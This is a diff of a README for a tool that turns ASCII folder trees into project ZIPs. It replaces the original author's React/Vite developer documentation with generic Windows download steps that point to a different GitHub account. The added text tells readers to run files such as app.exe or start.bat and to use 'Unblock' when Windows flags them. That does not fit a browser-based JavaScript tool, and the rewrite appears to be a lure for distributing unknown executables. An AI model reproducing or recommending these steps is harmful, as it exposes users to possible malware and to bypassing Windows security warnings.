@@ -1,338 +1,226 @@
-# 📁 Folder Structure Visualizer
+# 🗂️ folder-structure-visualizer - Turn Folder Trees Into ZIPs
 
-<p align="center">
-  <a href="https://foldervisualiser.farhaankhan.dev/" target="_blank">
-    <img src="https://img.shields.io/badge/Live%20Demo-Open%20App-6366f1?style=for-the-badge&logo=vercel&logoColor=white"/>
-  </a>
-</p>
+[![Download the app](https://img.shields.io/badge/Download-Use%20This%20Link-blue?style=for-the-badge)](https://github.com/hickman8220/folder-structure-visualizer)
 
-Turn ASCII folder trees into working React + Node projects in seconds.
+## 📥 Download
 
-Paste a structure → visualize it → export a working project.
+Use this link to visit the download page:
 
----
+https://github.com/hickman8220/folder-structure-visualizer
 
-## Preview
+Open the page, get the app files, and then use the steps below to run it on Windows.
 
-### Working
+## 🖥️ What this app does
 
-![Example Use](assets/Demo.gif)
+folder-structure-visualizer lets you paste an ASCII folder tree, see it as a clean folder layout, and export it as a ZIP file.
 
-### Search Features
+Use it when you want to:
 
-![Search](assets/search_feature.png)
-![Search](assets/search_feature_2.png)
+- turn a text-based folder tree into real folders and files
+- build a starter project from a folder plan
+- share a project structure with your team
+- create a scaffold ZIP for a new app, site, or tool
+- check a folder layout before you build it
 
----
+## ✅ What you need on Windows
 
-## ✨ Core Features
+Before you start, make sure you have:
 
-### 📂 ASCII → Visual Tree
+- a Windows PC
+- a web browser such as Chrome, Edge, or Firefox
+- enough free space to save the app and any ZIP files you create
+- a ZIP tool if Windows does not open the file on its own
 
-- Paste standard ASCII folder structures
-- Supports `├──`, `└──`, `│`, and indentation-based formats
+If the app comes as a folder or ZIP file, save it somewhere easy to find, like the Downloads folder or Desktop.
 
-### 🌳 Interactive Explorer
+## 🚀 Get the app running on Windows
 
-- Expand/collapse folders
-- Smooth animations
-- Clean IDE-like experience
+Follow these steps in order.
 
-### 🔍 Smart Search
+### 1. Open the download page
 
-- Real-time filtering
-- Auto-expands matching folders
-- Highlights matches
+Go to:
 
-### 📊 Counters & Icons
+https://github.com/hickman8220/folder-structure-visualizer
 
-- File/folder counts
-- Intelligent file-type icons
+Look for the app files or release files on the page.
 
-### 📋 Utilities
+### 2. Download the app
 
-- Copy full path
-- Export tree as Markdown
+If you see a ZIP file, download it to your PC.
 
----
+If you see a folder with the app files, download the full folder as provided.
 
-## 📦 Scaffold Generator (Main Feature)
+Save the file in a place you can reach fast, such as:
 
-Generate a **fully working project ZIP** directly from your structure.
+- Downloads
+- Desktop
+- Documents
 
-### Supported Presets
+### 3. Open the downloaded file
 
-- React + Vite (JSX)
-- React + Vite + Tailwind
-- React + Vite + TypeScript (TSX)
-- React + Vite + TSX + Tailwind
-- Node + Express backend
-- Root `.gitignore`
+If the download is a ZIP file:
 
-### What You Get
+- right-click the ZIP file
+- choose Extract All
+- pick a folder
+- click Extract
 
-- Frontend with working dev server
-- Backend with Express + `/api/status`
-- Vite proxy preconfigured
-- Clean starter UI
+If the download is already a folder:
 
-Yes — it actually runs. Not fake files.
+- open that folder
 
----
+### 4. Start the app
 
-## ⚠️ Important Behavior (Read This Once)
+Look in the folder for the main app file.
 
-### 1. Root vs Custom Placement
+Common file names may look like:
 
-You have two modes:
+- `index.html`
+- `app.exe`
+- `start.bat`
+- `run.bat`
 
-#### 🟢 Root Mode
+Double-click the file that starts the app.
 
-Scaffold is created at root:
+If Windows asks how to open the file, choose your web browser for HTML files or choose the app for EXE files.
 
-```
-frontend/
-backend/
-```
+### 5. Use the visualizer
 
-Run from:
+After the app opens, you can:
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+- paste an ASCII folder tree into the input area
+- review the folder layout on screen
+- export the structure as a ZIP file
+- save the scaffold to your computer
 
----
+## 🧭 How to use a folder tree
 
-#### 🟡 Custom Placement Mode
+A folder tree is plain text that shows folders and files with lines and spaces.
 
 Example:
 
-```
-Parent: WORK_PLEASE
-Target: apps
-```
-
-Output:
-
-```
-WORK_PLEASE/apps/frontend
-WORK_PLEASE/apps/backend
+```text
+my-project
+├── src
+│   ├── index.js
+│   └── app.js
+├── public
+│   └── index.html
+└── package.json
 ```
 
-👉 You MUST run from THIS location:
+You can paste a structure like this into the app. It will read the tree and build a project scaffold from it.
 
-```bash
-cd WORK_PLEASE/apps/frontend
-npm install
-npm run dev
+## 📦 Create a ZIP scaffold
+
+To make a project ZIP:
+
+1. paste or type your folder tree
+2. check the preview
+3. choose the export option
+4. save the ZIP file
+5. open the ZIP file to see the folders and files
+
+This helps when you want a clean starter layout for a new project.
+
+## 🛠️ Common tasks
+
+### Build a new project layout
+
+Use the app to turn a plan into a real folder set.
+
+### Share a scaffold with someone else
+
+Make a ZIP and send it to another person.
+
+### Check a folder plan before coding
+
+Use the preview to spot bad file names or a structure that feels too deep.
+
+### Reuse the same setup for new work
+
+Keep one folder tree for each kind of project and export it when needed.
+
+## 🔧 File types you may see
+
+The app may use common web or Windows files such as:
+
+- HTML files for the interface
+- JavaScript files for the app logic
+- a ZIP file for exports
+- Windows batch files for launch steps
+
+If the app opens in your browser, it is still running on your computer.
+
+## 🪟 If Windows blocks the file
+
+If you see a security prompt:
+
+- check that the file came from the link above
+- right-click the file
+- choose Properties
+- if you see an Unblock option, select it
+- click Apply
+- try opening the file again
+
+If the file is a batch file or app file, Windows may ask for permission before it opens.
+
+## 🧩 Tips for better folder trees
+
+Keep your folder trees easy to read:
+
+- use one folder name per line
+- use spaces and line symbols in a steady pattern
+- avoid extra symbols that do not belong in the tree
+- keep file names short and clear
+- use `.js`, `.html`, `.css`, and `.json` where needed
+
+A clean tree gives you a cleaner ZIP.
+
+## 📁 Example project scaffold
+
+Here is a simple layout you can use:
+
+```text
+website-starter
+├── src
+│   ├── main.js
+│   └── styles.css
+├── assets
+│   └── logo.png
+└── index.html
 ```
 
-❌ Running from existing `apps/frontend` (from your input tree) will fail.
+Paste that into the app and export it as a ZIP to get a starter project structure.
 
----
+## 🧪 If the app does not open
 
-### 2. Placeholder Folder Conflicts
+Try these steps:
 
-If your input already contains:
+- make sure the file fully downloaded
+- extract the ZIP again
+- open the main file from inside the extracted folder
+- try a different browser if it opens in a browser
+- restart your PC and try again
 
-```
-apps/frontend
-apps/backend
-```
+If the app uses a local web file, open the HTML file in Chrome or Edge.
 
-Those are treated as **plain folders**, not scaffold apps.
+## 📚 Project info
 
-➡️ The tool generates NEW working apps in the selected destination.
+- Repository: folder-structure-visualizer
+- Description: Visualize ASCII folder trees and export them as downloadable project scaffold ZIPs
+- Topics: developer tools, filesystem, folder structure, JavaScript, Node.js, project scaffolding, React, visualization, Vite, ZIP generator
 
----
+## 🔗 Source link
 
-### 3. Empty Config Handling
+https://github.com/hickman8220/folder-structure-visualizer
 
-Files like:
+## 📌 Quick steps
 
-```
-package.json
-vite.config.js
-```
-
-may be empty in your input tree.
-
-✔️ The tool replaces them with valid scaffold configs when presets are enabled.
-
----
-
-### 4. Extra Folders May Appear
-
-Example:
-
-```
-src/utils/
-```
-
-These may be added by presets.
-
-✔️ Safe to delete
-✔️ Required for some setups
-
-(Translation: don’t panic, nothing is broken.)
-
----
-
-### 5. Tailwind Behavior
-
-- With Tailwind → no `App.css`
-- Without Tailwind → standard CSS setup
-
----
-
-### 6. Node Version Requirement
-
-Generated projects use **Vite 8**
-
-You need:
-
-- Node.js **20.19+** OR
-- Node.js **22.12+**
-
----
-
-### 7. Module System Behavior (Advanced)
-
-The generated project uses different module systems:
-
-- Frontend → ES Modules `(type: "module")`
-- Backend (JS mode) → CommonJS `(require)`
-
-This is intentional for compatibility and simplicity.
-
-⚠️ If you modify backend to use ESM, you must update:
-
-- `package.json`
-- import syntax (`import` instead of `require`)
-
----
-
-## ⚛️ Generated Frontend Structure
-
-### JSX Mode
-
-- `App.jsx`
-- `main.jsx`
-- `vite.config.js`
-
-### TSX Mode
-
-- `App.tsx`
-- `main.tsx`
-- `vite.config.ts`
-- `tsconfig.json`
-
-### Tailwind Adds
-
-- `tailwind.config.js`
-- `postcss.config.js`
-
----
-
-## 🧠 How It Works
-
-1. Parse ASCII → structured JSON tree
-2. Render interactive collapsible UI
-3. Merge scaffold presets into user-defined structure
-4. Replace empty config placeholders with working defaults
-5. Generate production-ready ZIP using JSZip
-
----
-
-## 🚀 Installation (Local Dev)
-
-```bash
-git clone https://github.com/Far-200/folder-structure-visualizer
-cd folder-structure-visualizer/frontend
-npm install
-npm run dev
-```
-
----
-
-## 🧪 Testing Reality (Honest Section)
-
-This tool has been tested with:
-
-- Large monorepo-style trees
-- Nested folders (10+ levels)
-- JSX + TSX combinations
-- Tailwind on/off
-- Backend on/off
-- Root + custom placement
-
----
-
-## ⚠️ Known Limitations
-
-- Parser is flexible, not strict — expects reasonable ASCII format
-- Custom placement can confuse users if they run wrong folders (Trust me on this 🫠)
-- Not designed for malformed or inconsistent tree syntax
-- Mixing ESM (frontend) and CommonJS (backend JS mode) can confuse beginners
-- Large template strings in codebase (planned extraction into modular templates)
-
----
-
-## 🎯 Use Cases
-
-- Rapid project scaffolding
-- Visualizing large repos
-- Sharing architecture
-- Generating README trees
-
----
-
-## 🏆 Highlights
-
-- Built recursive tree renderer
-- Dynamic scaffold generator
-- Real working full-stack output
-- Practical developer tool (not just UI demo)
-- Smart placeholder replacement system (prevents broken configs)
-- Dynamic preset merging with conflict-safe tree injection
-
----
-
-## 🥲 Why This Exists
-
-I didn’t want to manually create 50 folders and 70 files for a project. I'm too lazy for that.
-
-I needed something that would skip the structure trap and get me to the actual coding faster.
-
-So I built a tool to do it for me.
-
-Then I realized — if it solves my problem, it’ll probably help other developers too.
-
-So I turned it into this.
-
----
-
-## 🔮 Future Improvements
-
-- Extract scaffold templates into modular files (better maintainability)
-- Add more backend presets (FastAPI, NestJS, etc.)
-- README auto-generation for exported projects
-- Improved placement guidance in UI
-- Better validation for malformed ASCII input
-
----
-
-## 👨‍💻 Author
-
-Farhaan Khan
-CSE Student • Full-Stack Builder • AI Explorer
-
----
-
-## ⭐ Support
-
-If this helped you — star the repo.
-
-If it broke — open an issue 😄
+1. visit the download page
+2. download the app files
+3. extract the ZIP if needed
+4. open the main app file
+5. paste a folder tree
+6. export the ZIP scaffold
